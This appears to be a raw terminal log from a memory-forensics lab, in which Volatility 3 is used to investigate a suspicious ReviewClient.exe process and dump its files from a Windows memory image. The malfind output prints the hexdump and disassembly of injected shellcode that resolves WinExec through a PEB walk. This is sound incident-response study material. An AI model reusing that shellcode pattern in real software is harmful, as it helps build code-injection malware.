+Progress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        /home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/deprecation.py:28: FutureWarning: This API (volatility3.plugins.windows.malware.malfind.Malfind.run) will be removed in the first release after 2026-06-07. This plugin has been renamed, please call volatility3.plugins.windows.malware.malfind.Malfind rather than volatility3.plugins.windows.malfind.Malfind.
+  warnings.warn(
+
+PID	Process	Start VPN	End VPN	Tag	Protection	CommitCharge	PrivateMemory	File output	Notes	Hexdump	Disasm
+/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/deprecation.py:105: FutureWarning: This plugin (volatility3.plugins.windows.malfind.Malfind) has been renamed and will be removed in the first release after 2026-06-07. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.malware.malfind.Malfind
+  warnings.warn(
+
+6260	ReviewClient.e	0x8e0000	0x8e0fff	VadS	PAGE_EXECUTE_READWRITE	1	1	pid.6260.vad.0x8e0000-0x8e0fff.dmp	Function prologue	
+55 89 e5 83 ec 18 31 f6 56 6a 63 66 68 78 65 68 U.....1.Vjcfhxeh
+57 69 6e 45 89 65 fc 64 8b 5e 30 8b 5b 0c 8b 5b WinE.e.d.^0.[..[
+14 8b 1b 8b 1b 8b 5b 10 89 5d f8 8b 43 3c 01 d8 ......[..]..C<..
+8b 40 78 01 d8 8b 48 24 01 d9 89 4d f4 31 c9 41 .@x...H$...M.1.A	
+0x8e0000:	push	ebp
+0x8e0001:	mov	ebp, esp
+0x8e0003:	sub	esp, 0x18
+0x8e0006:	xor	esi, esi
+0x8e0008:	push	esi
+0x8e0009:	push	0x63
+0x8e000b:	push	0x6578
+0x8e000f:	push	0x456e6957
+0x8e0014:	mov	dword ptr [ebp - 4], esp
+0x8e0017:	mov	ebx, dword ptr fs:[esi + 0x30]
+0x8e001b:	mov	ebx, dword ptr [ebx + 0xc]
+0x8e001e:	mov	ebx, dword ptr [ebx + 0x14]
+0x8e0021:	mov	ebx, dword ptr [ebx]
+0x8e0023:	mov	ebx, dword ptr [ebx]
+0x8e0025:	mov	ebx, dword ptr [ebx + 0x10]
+0x8e0028:	mov	dword ptr [ebp - 8], ebx
+0x8e002b:	mov	eax, dword ptr [ebx + 0x3c]
+0x8e002e:	add	eax, ebx
+0x8e0030:	mov	eax, dword ptr [eax + 0x78]
+0x8e0033:	add	eax, ebx
+0x8e0035:	mov	ecx, dword ptr [eax + 0x24]
+0x8e0038:	add	ecx, ebx
+0x8e003a:	mov	dword ptr [ebp - 0xc], ecx
+0x8e003d:	xor	ecx, ecx
+0x8e003f:	inc	ecx
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mls -la /tmp/out[27mls -la /tmp/out
+[?2004ltotal 20
+drwxrwxr-x  2 ubuntu ubuntu  4096 Oct 22 23:07 [0m[01;34m.[0m
+drwxrwxrwt 17 root   root   12288 Oct 22 23:07 [30;42m..[0m
+-rw-------  1 ubuntu ubuntu  4096 Oct 22 23:07 pid.6260.vad.0x8e0000-0x8e0fff.dmp
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.filescan > /tmp/filescan.txt 2>/dev/n[27m[7mu[27m[7mll[27m[A(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ vol -s symbols -f memory.mem windows.filescan > /tmp/filescan.txt 2>/dev/null
+[?2004l^C
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -iE "DocumentReview|\.png" /tmp/filescan.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -iE "DocumentReview|\.png" /tmp/filescan.txt
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.handles --pid 6260 > /tmp/handles.txt[27m [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem windows.handles --pid 6260 > /tmp/handles.txt [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kt
+[?2004lProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        [?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ 
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -i "File" /tmp/handles.txt | grep -iv "\\\\Windows\\\\"[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -i "File" /tmp/handles.txt | grep -iv "\\\\Windows\\\\"
+[?2004l6260	ReviewClient.e	0xbd8fdbca2640	0x40	File	0x100020	\Device\HarddiskVolume1\Windows
+6260	ReviewClient.e	0xbd8fdbcb0bf0	0x84	File	0x100020	\Device\HarddiskVolume1\Users\s.reyes\Downloads\DocumentReview
+6260	ReviewClient.e	0x9389f8b1b5e0	0xcc	Key	0x9	MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS
+6260	ReviewClient.e	0xbd8fdbcb3c60	0x108	File	0x120089	\Device\HarddiskVolume1\Users\s.reyes\Downloads\DocumentReview\review-cache.dat
+6260	ReviewClient.e	0xbd8fdbcb5a10	0x10c	File	0x120089	\Device\HarddiskVolume1\Users\s.reyes\Downloads\DocumentReview\review-cover.png
+6260	ReviewClient.e	0xbd8fdbcb77c0	0x1b8	File	0x100001	\Device\CNG
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.dlllist --pid 6260 > /tmp/dlls.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem windows.dlllist --pid 6260 > /tmp/dlls.txt
+[?2004lProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        [?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ 
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -i "DocumentReview" /tmp/dlls.txt[27mgrep -i "DocumentReview" /tmp/dlls.txt
+[?2004l6260	ReviewClient.e	0x920000	0x19000	ReviewClient.exe	C:\Users\s.reyes\Downloads\[01;31m[KDocumentReview[m[K\ReviewClient.exe	-1	2026-10-05 03:54:18.000000 UTC	Disabled
+6260	ReviewClient.e	0x920000	0x19000	ReviewClient.exe	C:\Users\s.reyes\Downloads\[01;31m[KDocumentReview[m[K\ReviewClient.exe	-	1676-10-25 20:40:16.000000 UTC	Disabled
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.filescan > /tmp/filescan.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem windows.filescan > /tmp/filescan.txt
+[?2004lProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        grep -iE "DocumentReview|\.png" /tmp/filescan.txt
+grep -iE "DocumentReview|\.png" /tmp/filescan.txt                                                 ^CTraceback (most recent call last):
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/bin/vol", line 8, in <module>
+    sys.exit(main())
+             ^^^^^^
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/cli/__init__.py", line 942, in main
+    CommandLine().run()
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/cli/__init__.py", line 527, in run
+    renderer.render(grid)
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/cli/text_renderer.py", line 330, in render
+    grid.populate(visitor, outfd)
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/renderers/__init__.py", line 318, in populate
+    for level, item in self._generator:
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/plugins/windows/filescan.py", line 61, in _generator
+    for fileobj in self.scan_files(self.context, self.config["kernel"]):
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/plugins/windows/filescan.py", line 54, in scan_files
+    for result in poolscanner.PoolScanner.generate_pool_scan(
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/plugins/windows/poolscanner.py", line 503, in generate_pool_scan
+    yield from cls.generate_pool_scan_extended(
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/plugins/windows/poolscanner.py", line 431, in generate_pool_scan_extended
+    for constraint, header in cls.pool_scan(
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/plugins/windows/poolscanner.py", line 559, in pool_scan
+    yield from layer.scan(context, scanner, progress_callback)
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/interfaces/layers.py", line 258, in scan
+    yield from scan_chunk(value)
+               ^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/interfaces/layers.py", line 361, in _scan_chunk
+    data += self.context.layers[layer_name].read(address, chunk_size)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/layers/linear.py", line 63, in read
+    self._context.layers.read(layer, mapped_offset, mapped_length, pad)
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/interfaces/layers.py", line 636, in read
+    return self[layer].read(offset, length, pad)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/Desktop/artifacts/tools/venv/lib/python3.12/site-packages/volatility3/framework/layers/physical.py", line 168, in read
+    data = self._file.read(length)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.12/tempfile.py", line 638, in func_wrapper
+    return func(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^
+KeyboardInterrupt
+
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mgrep -iE "DocumentReview|\.png" /tmp/filescan.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cgrep -iE "DocumentReview|\.png" /tmp/filescan.txt
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem -o /tmp/out windows.dumpfiles --virtaddr 0xbd[27m[7m8[27m[7mfdbcb5a10 2>/dev/null[27m[A(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ vol -s symbols -f memory.mem -o /tmp/out windows.dumpfiles --virtaddr 0xbd8fdbcb5a10 2>/dev/null
+[?2004lVolatility 3 Framework 2.28.2
+
+Cache	FileObject	FileName	Result
+
+DataSectionObject	0xbd8fdbcb5a10	review-cover.png	file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png.dat
+SharedCacheMap	0xbd8fdbcb5a10	review-cover.png	file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png.vacb
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem -o /tmp/out windows.dumpfiles --virtaddr 0xbd[27m[7m8[27m[7mfdbcb3c60 2>/dev/null[27m[A(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ vol -s symbols -f memory.mem -o /tmp/out windows.dumpfiles --virtaddr 0xbd8fdbcb3c60 2>/dev/null
+[?2004lVolatility 3 Framework 2.28.2
+
+Cache	FileObject	FileName	Result
+
+DataSectionObject	0xbd8fdbcb3c60	review-cache.dat	file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat
+SharedCacheMap	0xbd8fdbcb3c60	review-cache.dat	file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat.vacb
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mls -la /tmp/out[27mls -la /tmp/out
+[?2004ltotal 568
+drwxrwxr-x  2 ubuntu ubuntu   4096 Oct 22 23:15 [0m[01;34m.[0m
+drwxrwxrwt 17 root   root    12288 Oct 22 23:11 [30;42m..[0m
+-rw-------  1 ubuntu ubuntu 262144 Oct 22 23:15 file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat.vacb
+-rw-------  1 ubuntu ubuntu   4096 Oct 22 23:15 file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat
+-rw-------  1 ubuntu ubuntu 262144 Oct 22 23:15 file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png.vacb
+-rw-------  1 ubuntu ubuntu  32768 Oct 22 23:15 file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png.dat
+-rw-------  1 ubuntu ubuntu   4096 Oct 22 23:07 pid.6260.vad.0x8e0000-0x8e0fff.dmp
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem -o /tmp/out windows.dumpfiles --pid 6260 2>/d[27m[7me[27m[7mv/null[27m[A(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ vol -s symbols -f memory.mem -o /tmp/out windows.dumpfiles --pid 6260 2>/dev/null
+[?2004lVolatility 3 Framework 2.28.2
+
+Cache	FileObject	FileName	Result
+
+DataSectionObject	0xbd8fdbcb3c60	review-cache.dat	file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat-1.dat
+SharedCacheMap	0xbd8fdbcb3c60	review-cache.dat	file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat-1.vacb
+DataSectionObject	0xbd8fdbcb5a10	review-cover.png	file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png-1.dat
+SharedCacheMap	0xbd8fdbcb5a10	review-cover.png	file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png-1.vacb
+DataSectionObject	0xbd8fdbcbb190	StaticCache.dat	Error dumping file
+SharedCacheMap	0xbd8fdbcbb190	StaticCache.dat	file.0xbd8fdbcbb190.0xbd8fdb9cea20.SharedCacheMap.StaticCache.dat.vacb
+ImageSectionObject	0xbd8fd4f5c250	kernel32.dll	file.0xbd8fd4f5c250.0xbd8fd499d990.ImageSectionObject.kernel32.dll.img
+DataSectionObject	0xbd8fdbcaa340	ReviewClient.exe	file.0xbd8fdbcaa340.0xbd8fdc40e850.DataSectionObject.ReviewClient.exe.dat
+ImageSectionObject	0xbd8fdbcaa340	ReviewClient.exe	file.0xbd8fdbcaa340.0xbd8fdc2aba20.ImageSectionObject.ReviewClient.exe.img
+DataSectionObject	0xbd8fdbf2bd10	uxtheme.dll	file.0xbd8fdbf2bd10.0xbd8fdbe6b7d0.DataSectionObject.uxtheme.dll.dat
+ImageSectionObject	0xbd8fdbf2bd10	uxtheme.dll	file.0xbd8fdbf2bd10.0xbd8fdc0cbc80.ImageSectionObject.uxtheme.dll.img
+ImageSectionObject	0xbd8fdbcba9c0	CoreMessaging.dll	file.0xbd8fdbcba9c0.0xbd8fdc08eb40.ImageSectionObject.CoreMessaging.dll.img
+ImageSectionObject	0xbd8fdbcbace0	TextShaping.dll	file.0xbd8fdbcbace0.0xbd8fdb412050.ImageSectionObject.TextShaping.dll.img
+DataSectionObject	0xbd8fdb8b8450	StaticCache.dat	Error dumping file
+SharedCacheMap	0xbd8fdb8b8450	StaticCache.dat	file.0xbd8fdb8b8450.0xbd8fdb9cea20.SharedCacheMap.StaticCache.dat.vacb
+ImageSectionObject	0xbd8fdbcb6500	CoreUIComponents.dll	file.0xbd8fdbcb6500.0xbd8fdc08e8e0.ImageSectionObject.CoreUIComponents.dll.img
+ImageSectionObject	0xbd8fdb1eaa80	TextInputFramework.dll	file.0xbd8fdb1eaa80.0xbd8fdc4a68a0.ImageSectionObject.TextInputFramework.dll.img
+ImageSectionObject	0xbd8fdaf69ed0	WinTypes.dll	file.0xbd8fdaf69ed0.0xbd8fdbe90a20.ImageSectionObject.WinTypes.dll.img
+ImageSectionObject	0xbd8fd4f5d9c0	bcryptprimitives.dll	file.0xbd8fd4f5d9c0.0xbd8fd4854400.ImageSectionObject.bcryptprimitives.dll.img
+ImageSectionObject	0xbd8fdbe0a9d0	kernel.appcore.dll	file.0xbd8fdbe0a9d0.0xbd8fdbd43990.ImageSectionObject.kernel.appcore.dll.img
+ImageSectionObject	0xbd8fdbf02370	apphelp.dll	file.0xbd8fdbf02370.0xbd8fdb589240.ImageSectionObject.apphelp.dll.img
+ImageSectionObject	0xbd8fdbc8d330	ntmarta.dll	file.0xbd8fdbc8d330.0xbd8fdb924010.ImageSectionObject.ntmarta.dll.img
+ImageSectionObject	0xbd8fd4f5c700	msvcrt.dll	file.0xbd8fd4f5c700.0xbd8fd4854630.ImageSectionObject.msvcrt.dll.img
+ImageSectionObject	0xbd8fd4f5d830	ws2_32.dll	file.0xbd8fd4f5d830.0xbd8fd499e010.ImageSectionObject.ws2_32.dll.img
+ImageSectionObject	0xbd8fd46d1c20	ntdll.dll	file.0xbd8fd46d1c20.0xbd8fd46a0bc0.ImageSectionObject.ntdll.dll.img
+ImageSectionObject	0xbd8fd4ea0570	imm32.dll	file.0xbd8fd4ea0570.0xbd8fd499c010.ImageSectionObject.imm32.dll.img
+ImageSectionObject	0xbd8fd4f5ced0	rpcrt4.dll	file.0xbd8fd4f5ced0.0xbd8fd499d270.ImageSectionObject.rpcrt4.dll.img
+ImageSectionObject	0xbd8fd4f5d380	KernelBase.dll	file.0xbd8fd4f5d380.0xbd8fd499d4d0.ImageSectionObject.KernelBase.dll.img
+ImageSectionObject	0xbd8fd4f5cd40	sechost.dll	file.0xbd8fd4f5cd40.0xbd8fd499d730.ImageSectionObject.sechost.dll.img
+ImageSectionObject	0xbd8fd4f5d1f0	gdi32.dll	file.0xbd8fd4f5d1f0.0xbd8fd499cbf0.ImageSectionObject.gdi32.dll.img
+ImageSectionObject	0xbd8fd4f5d6a0	msctf.dll	file.0xbd8fd4f5d6a0.0xbd8fd499d010.ImageSectionObject.msctf.dll.img
+ImageSectionObject	0xbd8fd4ea0700	gdi32full.dll	file.0xbd8fd4ea0700.0xbd8fd499c4d0.ImageSectionObject.gdi32full.dll.img
+ImageSectionObject	0xbd8fd4ea0bb0	user32.dll	file.0xbd8fd4ea0bb0.0xbd8fd4999990.ImageSectionObject.user32.dll.img
+ImageSectionObject	0xbd8fd4ea0250	oleaut32.dll	file.0xbd8fd4ea0250.0xbd8fd499a010.ImageSectionObject.oleaut32.dll.img
+ImageSectionObject	0xbd8fd4ea16a0	combase.dll	file.0xbd8fd4ea16a0.0xbd8fd499a730.ImageSectionObject.combase.dll.img
+ImageSectionObject	0xbd8fd4ea1ce0	advapi32.dll	file.0xbd8fd4ea1ce0.0xbd8fd499b9e0.ImageSectionObject.advapi32.dll.img
+ImageSectionObject	0xbd8fd4ea1510	SHCore.dll	file.0xbd8fd4ea1510.0xbd8fd499a4d0.ImageSectionObject.SHCore.dll.img
+ImageSectionObject	0xbd8fd4ea1830	ucrtbase.dll	file.0xbd8fd4ea1830.0xbd8fd48563b0.ImageSectionObject.ucrtbase.dll.img
+ImageSectionObject	0xbd8fd4bd99c0	msvcp_win.dll	file.0xbd8fd4bd99c0.0xbd8fd4999010.ImageSectionObject.msvcp_win.dll.img
+ImageSectionObject	0xbd8fd4bd83e0	win32u.dll	file.0xbd8fd4bd83e0.0xbd8fd4856810.ImageSectionObject.win32u.dll.img
+ImageSectionObject	0xbd8fd4c15700	wow64cpu.dll	file.0xbd8fd4c15700.0xbd8fd4b09570.ImageSectionObject.wow64cpu.dll.img
+ImageSectionObject	0xbd8fd4266510	wow64.dll	file.0xbd8fd4266510.0xbd8fd4b0a570.ImageSectionObject.wow64.dll.img
+ImageSectionObject	0xbd8fd4c150c0	wow64win.dll	file.0xbd8fd4c150c0.0xbd8fd4b09ae0.ImageSectionObject.wow64win.dll.img
+ImageSectionObject	0xbd8fd46d21e0	ntdll.dll	file.0xbd8fd46d21e0.0xbd8fd469f820.ImageSectionObject.ntdll.dll.img
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mcd /tmp/out[27mcd /tmp/out
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: /tmp/out[01;32mubuntu@tryhackme[00m:[01;34m/tmp/out[00m$ ls
+[?2004lfile.0xbd8fd4266510.0xbd8fd4b0a570.ImageSectionObject.wow64.dll.img
+file.0xbd8fd46d1c20.0xbd8fd46a0bc0.ImageSectionObject.ntdll.dll.img
+file.0xbd8fd46d21e0.0xbd8fd469f820.ImageSectionObject.ntdll.dll.img
+file.0xbd8fd4bd83e0.0xbd8fd4856810.ImageSectionObject.win32u.dll.img
+file.0xbd8fd4bd99c0.0xbd8fd4999010.ImageSectionObject.msvcp_win.dll.img
+file.0xbd8fd4c150c0.0xbd8fd4b09ae0.ImageSectionObject.wow64win.dll.img
+file.0xbd8fd4c15700.0xbd8fd4b09570.ImageSectionObject.wow64cpu.dll.img
+file.0xbd8fd4ea0250.0xbd8fd499a010.ImageSectionObject.oleaut32.dll.img
+file.0xbd8fd4ea0570.0xbd8fd499c010.ImageSectionObject.imm32.dll.img
+file.0xbd8fd4ea0700.0xbd8fd499c4d0.ImageSectionObject.gdi32full.dll.img
+file.0xbd8fd4ea0bb0.0xbd8fd4999990.ImageSectionObject.user32.dll.img
+file.0xbd8fd4ea1510.0xbd8fd499a4d0.ImageSectionObject.SHCore.dll.img
+file.0xbd8fd4ea16a0.0xbd8fd499a730.ImageSectionObject.combase.dll.img
+file.0xbd8fd4ea1830.0xbd8fd48563b0.ImageSectionObject.ucrtbase.dll.img
+file.0xbd8fd4ea1ce0.0xbd8fd499b9e0.ImageSectionObject.advapi32.dll.img
+file.0xbd8fd4f5c250.0xbd8fd499d990.ImageSectionObject.kernel32.dll.img
+file.0xbd8fd4f5c700.0xbd8fd4854630.ImageSectionObject.msvcrt.dll.img
+file.0xbd8fd4f5cd40.0xbd8fd499d730.ImageSectionObject.sechost.dll.img
+file.0xbd8fd4f5ced0.0xbd8fd499d270.ImageSectionObject.rpcrt4.dll.img
+file.0xbd8fd4f5d1f0.0xbd8fd499cbf0.ImageSectionObject.gdi32.dll.img
+file.0xbd8fd4f5d380.0xbd8fd499d4d0.ImageSectionObject.KernelBase.dll.img
+file.0xbd8fd4f5d6a0.0xbd8fd499d010.ImageSectionObject.msctf.dll.img
+file.0xbd8fd4f5d830.0xbd8fd499e010.ImageSectionObject.ws2_32.dll.img
+file.0xbd8fd4f5d9c0.0xbd8fd4854400.ImageSectionObject.bcryptprimitives.dll.img
+file.0xbd8fdaf69ed0.0xbd8fdbe90a20.ImageSectionObject.WinTypes.dll.img
+file.0xbd8fdb1eaa80.0xbd8fdc4a68a0.ImageSectionObject.TextInputFramework.dll.img
+file.0xbd8fdb8b8450.0xbd8fd49d8330.DataSectionObject.StaticCache.dat.dat
+file.0xbd8fdb8b8450.0xbd8fdb9cea20.SharedCacheMap.StaticCache.dat.vacb
+file.0xbd8fdbc8d330.0xbd8fdb924010.ImageSectionObject.ntmarta.dll.img
+file.0xbd8fdbcaa340.0xbd8fdc2aba20.ImageSectionObject.ReviewClient.exe.img
+file.0xbd8fdbcaa340.0xbd8fdc40e850.DataSectionObject.ReviewClient.exe.dat
+file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat-1.vacb
+file.0xbd8fdbcb3c60.0xbd8fdc2f6d40.SharedCacheMap.review-cache.dat.vacb
+file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat-1.dat
+file.0xbd8fdbcb3c60.0xbd8fdc40ce10.DataSectionObject.review-cache.dat.dat
+file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png-1.vacb
+file.0xbd8fdbcb5a10.0xbd8fdc164400.SharedCacheMap.review-cover.png.vacb
+file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png-1.dat
+file.0xbd8fdbcb5a10.0xbd8fdc40d1d0.DataSectionObject.review-cover.png.dat
+file.0xbd8fdbcb6500.0xbd8fdc08e8e0.ImageSectionObject.CoreUIComponents.dll.img
+file.0xbd8fdbcba9c0.0xbd8fdc08eb40.ImageSectionObject.CoreMessaging.dll.img
+file.0xbd8fdbcbace0.0xbd8fdb412050.ImageSectionObject.TextShaping.dll.img
+file.0xbd8fdbcbb190.0xbd8fd49d8330.DataSectionObject.StaticCache.dat.dat
+file.0xbd8fdbcbb190.0xbd8fdb9cea20.SharedCacheMap.StaticCache.dat.vacb
